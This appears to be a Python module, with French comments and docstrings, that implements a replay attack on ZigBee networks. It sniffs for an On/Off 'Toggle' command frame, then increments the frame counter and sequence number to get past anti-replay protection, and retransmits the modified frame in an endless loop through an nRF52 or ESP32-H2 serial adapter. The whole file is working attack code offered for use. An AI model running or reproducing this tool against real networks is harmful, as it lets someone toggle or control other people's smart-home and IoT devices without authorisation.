"""
Module : zigbee_replay_attack
=============================

Ce module implémente une attaque de replay sur le réseau ZigBee.

Il permet de capturer des trames ZigBee, de les analyser, de les modifier et de les rejouer sur le réseau ZigBee.
Il gère également les mécanismes de protection contre les attaques de type replay et permet de personnaliser la configuration de l'attaque.

Classes:
    ZigbeeReplayAttack: Classe principale pour effectuer l'attaque de replay.

Exemple d'utilisation:
    >>> from zigbee_replay_attack import ZigbeeReplayAttack
    >>> attaque = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0', aes_key='ma_cle_aes')
    >>> attaque.lancer_attaque_replay(capture_live=True)
"""

import sys
import os
import json
import logging
import random
import serial
import threading
import queue
import time
import hashlib
from typing import Dict, Optional, List
from Cryptodome.Cipher import AES

from CodeurTrame import CodeurTrameZigbee
from DecodeurTrame import DecodeurTrameZigbee
from sniff import SniffeurZigbee
from frame_counter import ZigbeeFrameFinder

# Configuration du logging pour suivre l'exécution et enregistrer les événements
logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('zigbee_advanced_replay.log', encoding='utf-8')
    ]
)
logger = logging.getLogger(__name__)


class ZigbeeReplayAttack:
    """
    Classe pour effectuer une attaque de replay sur le réseau ZigBee.

    Cette classe permet de :
        - Capturer des trames ZigBee en direct ou depuis un fichier.
        - Analyser et filtrer les trames capturées.
        - Modifier certains paramètres (comme le numéro de séquence ou le compteur de trame).
        - Rejouer les trames modifiées sur le réseau ZigBee de façon répétée.

    Attributs:
        capture_file (str): Nom du fichier de capture des trames (par défaut 'captures_zigbee.json').
        channel (int): Canal ZigBee utilisé pour l'attaque (par défaut 13).
        pan_id (int): PAN ID du réseau ZigBee (par défaut 0x1900).
        serial_port (Optional[str]): Port série pour l'envoi des trames.
        aes_key (Optional[str]): Clé AES pour la sécurité des trames, si nécessaire.
        codeur (CodeurTrameZigbee): Instance de l'encodeur de trame ZigBee.
        decodeur (DecodeurTrameZigbee): Instance du décodeur de trame ZigBee.
        sniffer (SniffeurZigbee): Instance pour la capture des trames.
        framefinder (ZigbeeFrameFinder): Instance pour la gestion du compteur de trame.
        captures (list): Liste des trames capturées.
        replay_queue (queue.Queue): File d'attente pour la gestion des trames à rejouer.
    """

    def __init__(
        self, 
        capture_file: str = 'captures_zigbee.json', 
        channel: int = 13, 
        pan_id: int = 0x1900,
        serial_port: Optional[str] = None,
        aes_key: Optional[str] = None,
        materiel: str = 'nrf52'
    ):
        """
    Initialise une instance d'attaque par rejeu (replay attack) sur un réseau ZigBee.
    
    Cette méthode configure tous les composants nécessaires pour effectuer une attaque
    de type "replay" sur un réseau ZigBee. Elle initialise le sniffer, le codeur/décodeur
    de trames, et tous les paramètres essentiels à l'attaque.
    
    Paramètres
    ----------
    capture_file : str, optionnel
        Chemin vers le fichier où seront enregistrées les captures. Par défaut 'captures_zigbee.json'.
    channel : int, optionnel
        Canal ZigBee à utiliser pour la capture et l'envoi des trames. Doit être compris entre 11 et 26.
        Par défaut 13.
    pan_id : int, optionnel
        Identifiant du réseau personnel (PAN ID) ZigBee cible. Par défaut 0x1900.
    serial_port : Optional[str], optionnel
        Port série utilisé pour communiquer avec l'adaptateur ZigBee. Si None, une détection
        automatique sera tentée. Par défaut None.
    aes_key : Optional[str], optionnel
        Clé AES pour déchiffrer/chiffrer les trames ZigBee sécurisées. 
        Si None, les trames chiffrées ne seront pas traitées. Par défaut None.
    materiel : str, optionnel
        Type de matériel utilisé pour la capture ('nrf52' ou 'esp32h2'). Par défaut 'nrf52'.
    
    Notes
    -----
    - Le port série doit être configuré correctement pour fonctionner avec le matériel spécifié.
    - L'objet ZigbeeFrameFinder est utilisé pour gérer les compteurs de trames et numéros de séquence.
    - Les instances de CodeurTrameZigbee et DecodeurTrameZigbee sont utilisées pour encoder et
      décoder les trames ZigBee.
    
    Exemple
    -------
    >>> attaque = ZigbeeReplayAttack(
    ...     capture_file='test_capture.json',
    ...     channel=15,
    ...     serial_port='/dev/ttyUSB0',
    ...     materiel='esp32h2'
    ... )
    """
        self.capture_file = capture_file
        self.channel = channel
        self.pan_id = pan_id
        self.serial_port = serial_port
        self.aes_key = aes_key
        
        self.codeur = CodeurTrameZigbee(logger)
        self.decodeur = DecodeurTrameZigbee(logger)
        self.sniffer = SniffeurZigbee(
            canal=channel,
            fichier_sortie=capture_file,
            vitesse_bauds=115200,
            materiel=materiel
        )
        self.framefinder = ZigbeeFrameFinder()
        self.captures = []
        self.replay_queue = queue.Queue()

    def attendre_trame_data(self, timeout: int = 30) -> Optional[str]:
        """
    Capture en direct une trame ZigBee de type Data correspondant à une commande toggle.
    
    Cette méthode configure et démarre le sniffer ZigBee pour capturer les trames en temps réel.
    Elle filtre les trames capturées pour identifier spécifiquement une trame de type Data
    provenant du cluster 0x0600 (On/Off) avec un command_id de 0x02 (Toggle) et ayant une longueur
    inférieure à 100 octets. Une fois une trame correspondante trouvée, la capture est arrêtée
    et la trame est retournée sous forme hexadécimale.
    
    Paramètres
    ----------
    timeout : int, optionnel
        Durée maximale d'attente en secondes avant d'abandonner la recherche d'une trame
        correspondante. Par défaut 30 secondes.
    
    Retourne
    --------
    Optional[str]
        La trame ZigBee capturée sous forme de chaîne hexadécimale si une trame correspondante
        est trouvée dans le délai imparti, ou None si aucune trame n'est trouvée.
    
    Notes
    -----
    - La méthode réinitialise le sniffer avant de commencer la capture pour éviter 
      des interférences avec des captures précédentes.
    - Les trames de type Data ne correspondant pas aux critères sont affichées à des fins
      de diagnostic et supprimées de la liste des captures.
    - La méthode effectue un polling à intervalle régulier de 0.1 seconde pour vérifier
      les nouvelles captures.
    
    Exceptions
    ----------
    - Les exceptions KeyError lors de l'accès aux attributs des trames sont attrapées et ignorées.
    - D'autres exceptions potentielles (ex: problèmes de communication série) ne sont pas
      explicitement gérées par cette méthode.
    
    Exemple
    -------
    >>> replay = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0')
    >>> trame_toggle = replay.attendre_trame_data(timeout=60)
    >>> if trame_toggle:
    ...     print(f"Trame toggle capturée: {trame_toggle}")
    ... else:
    ...     print("Aucune trame toggle n'a pu être capturée dans le délai imparti.")
    """
        self.sniffer.reinitialiser() 
        logger.info("Attente d'une trame Toggle...")
        self.sniffer.demarrer_sniffer()
        
        start_time = time.time()
        while time.time() - start_time < timeout:
            if self.sniffer.captures:
                for capture in self.sniffer.captures:
                    try:
                        
                        # Filtrage de la trame selon le type, le cluster, le command_id et la taille
                        if (capture.get('type_trame') == 'Data' and
                            capture.get('couche_aps', {}).get('cluster_id', '').lower() == '0600' and
                            capture.get('couche_zcl', {}).get('command_id', '').lower() == '02') and len(capture['metadonnees']['trame_brute']) < 100:
                            
                            hex_data = capture['metadonnees']['trame_brute']
                            
                            # Décodage de la trame pour affichage (facultatif)
                            decode = DecodeurTrameZigbee()
                            octets = bytes.fromhex(hex_data)
                            print(decode.decoder_trame_data(octets))
                            
                            logger.info("Trame Toggle détectée")
                            
                            self.sniffer.arreter_sniffer()
                            self.sniffer.reinitialiser()
                            return hex_data
                        else:
                            # Afficher la trame si elle n'est pas conforme aux critères et la supprimer
                            if capture.get('type_trame') == 'Data' and len(capture['metadonnees']['trame_brute']) < 95:
                                print(capture['metadonnees']['trame_brute'])
                            self.sniffer.captures.remove(capture)
                    except KeyError:
                        continue
            time.sleep(0.1)
            
        self.sniffer.arreter_sniffer()
        logger.error("Timeout: Aucune trame Toggle trouvée")
        return None

    def envoyer_trames_en_boucle(self):
        """
    Envoie en boucle des trames de replay modifiées sur le réseau ZigBee.
    
    Cette méthode capture d'abord une trame initiale (de type toggle) en utilisant 
    `attendre_trame_data()`, puis la modifie en incrémentant progressivement certains 
    champs comme le compteur de trame et le numéro de séquence. Les trames modifiées 
    sont envoyées en continu sur le réseau ZigBee via le port série spécifié, 
    avec un délai de 3 secondes entre chaque envoi.
    
    Le processus comporte les étapes suivantes:
    1. Capture d'une trame toggle initiale
    2. Suppression des 4 derniers octets (FCS) de la trame
    3. Ouverture du port série pour l'envoi
    4. Pour le matériel ESP32H2, envoi d'une commande pour passer en mode transmission
    5. Modification et envoi continu des trames avec incrémentation des compteurs
    
    Notes
    -----
    - La trame initiale est tronquée de ses 4 derniers octets qui correspondent au FCS 
      (Frame Check Sequence), car celui-ci sera recalculé automatiquement par l'adaptateur ZigBee.
    - Les compteurs sont incrémentés à chaque itération pour contourner les protections
      anti-replay du protocole ZigBee.
    - Si aucune trame n'est capturée initialement, la méthode se termine sans erreur.
    
    Exceptions
    ----------
    - Toute exception lors de l'envoi d'une trame spécifique est capturée, journalisée,
      et provoque l'arrêt de la boucle d'envoi.
    - Les exceptions de type serial.SerialException sont capturées et journalisées
      lorsqu'il y a un problème avec le port série.
    
    Exemple
    -------
    >>> replay = ZigbeeReplayAttack(serial_port='/dev/ttyUSB0')
    >>> # La méthode s'exécutera jusqu'à ce qu'elle soit interrompue par l'utilisateur
    >>> # ou qu'une exception se produise
    >>> replay.envoyer_trames_en_boucle()
    """
        trame_initiale = self.attendre_trame_data() #"6188f2eff4ffff00004818ffff00001e19a13260feffbd4d742f3c60feffbd4d74400a060004010152010202"#
        if not trame_initiale:
            return
        
        # Suppression des 4 derniers octets de la trame initiale
        trame_initiale = trame_initiale[:-4]
        print("Trame initiale : ", trame_initiale)
        
        try:
            with serial.Serial(self.serial_port, baudrate=115200, timeout=1) as ser:
                logger.info(f"Début de l'envoi sur {self.serial_port}")
                if self.sniffer.materiel == 'esp32h2':
                    ser.write(bytes("#CMD#MODE_TX",'utf-8'))
                # Modification de la trame en incrémentant le compteur de trame
                trame_modifiee = self.framefinder.increment_frame_counter(trame_initiale)
                print("Trame modifiée : ", trame_modifiee)
                trame_bytes = bytes.fromhex(trame_modifiee)

                # Envoi en boucle de la trame modifiée
                while True:
                    try:
                        # Préfixe de trame ('61') ajouté à la trame modifiée
                        ser.write(bytes.fromhex('61') + trame_bytes)
                        logger.debug(f"Trame envoyée : {trame_bytes.hex()}")
                        time.sleep(3) 
                        print("Trame envoyée : ", trame_bytes.hex())
                        
                        # Incrémentation du compteur de trame et du numéro de séquence pour la prochaine itération
                        trame_modifiee = self.framefinder.increment_frame_counter(trame_bytes.hex(), increment=1)
                        trame_modifiee = self.framefinder.increment_sequence_number(trame_modifiee, increment=1)

                        trame_bytes = bytes.fromhex(trame_modifiee)
                        print("Trame modifiée (extrait compteur) : ", trame_bytes.hex()[-8:-6])
                        
                    except Exception as e:
                        logger.error(f"Erreur d'envoi : {e}")
                        break
        except serial.SerialException as e:
            logger.error(f"Erreur port série : {e}")

    def lancer_attaque_replay(self, capture_live: bool = True):
        """
    Lance l'attaque de replay sur le réseau ZigBee.
    
    Cette méthode coordonne l'exécution complète de l'attaque par rejeu. Elle peut 
    fonctionner selon deux modes:
    1. Mode capture en direct: capture des trames en temps réel, puis rejeu
    2. Mode fichier: utilisation de trames précédemment capturées depuis un fichier
    
    Un thread dédié est créé pour exécuter la fonction `envoyer_trames_en_boucle()`,
    qui gère l'envoi répété des trames modifiées. La méthode attend la fin de ce thread
    avant de se terminer.
    
    Paramètres
    ----------
    capture_live : bool, optionnel
        Si True, active le mode de capture en direct des trames à partir du réseau.
        Si False, utilise un fichier de capture existant spécifié dans l'attribut `capture_file`.
        Par défaut True.
    
    Notes
    -----
    - En mode fichier (capture_live=False), la méthode tente de charger les captures 
      depuis le fichier spécifié lors de l'initialisation.
    - L'exécution est bloquante jusqu'à la fin du thread d'envoi, qui normalement
      s'exécute indéfiniment jusqu'à ce qu'une erreur se produise ou que l'utilisateur
      l'interrompe manuellement.
    
    Exceptions
    ----------
    - Toute exception survenant pendant l'exécution de l'attaque est capturée et journalisée,
      mais n'est pas propagée à l'appelant.
    - Les exceptions possibles incluent les erreurs de lecture de fichier, les problèmes
      de communication série, ou les erreurs lors de la manipulation des trames.
    
    Exemple
    -------
    >>> replay = ZigbeeReplayAttack(
    ...     serial_port='/dev/ttyUSB0',
    ...     capture_file='trames_precedentes.json'
    ... )
    >>> # Lancer l'attaque avec capture en direct
    >>> replay.lancer_attaque_replay(capture_live=True)
    >>> 
    >>> # Ou utiliser un fichier de capture existant
    >>> replay.lancer_attaque_replay(capture_live=False)
    """
        try:
            if capture_live:
                logger.info("Mode capture live activé")
            else:
                with open(self.capture_file, 'r') as f:
                    self.captures = json.load(f)

            thread_replay = threading.Thread(target=self.envoyer_trames_en_boucle)
            thread_replay.start()
            thread_replay.join()

        except Exception as e:
            logger.error(f"Échec de l'attaque : {e}")
